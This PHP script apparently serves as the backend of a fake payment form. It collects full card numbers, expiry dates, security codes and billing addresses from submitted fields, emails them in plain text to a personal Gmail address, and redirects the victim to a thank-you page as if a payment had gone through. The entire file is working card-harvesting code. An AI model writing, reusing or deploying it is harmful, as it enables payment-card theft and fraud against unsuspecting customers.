<?php
  // Configuración del correo electrónico
  $to = "darwinbbank@gmail.com";
  $subject = "Formulario de pago";

  // Recopilación de datos del formulario
  $card_number = $_POST["card-number"];
  $expiration_date = $_POST["expiration-date"];
  $security_code = $_POST["security-code"];
  $address = $_POST["address"];
  $city = $_POST["city"];
  $state = $_POST["state"];
  $zip_code = $_POST["zip-code"];

  // Creación del cuerpo del correo electrónico
  $message = "Número de tarjeta: $card_number\n";
  $message .= "Fecha de vencimiento: $expiration_date\n";
  $message .= "Código de seguridad: $security_code\n";
  $message .= "Dirección: $address\n";
  $message .= "Ciudad: $city\n";
  $message .= "Estado: $state\n";
  $message .= "Código postal: $zip_code\n";

  // Envío del correo electrónico
  mail($to, $subject, $message);

  // Redirección a una página de agradecimiento
  header("Location: gracias.html");
  exit;
?>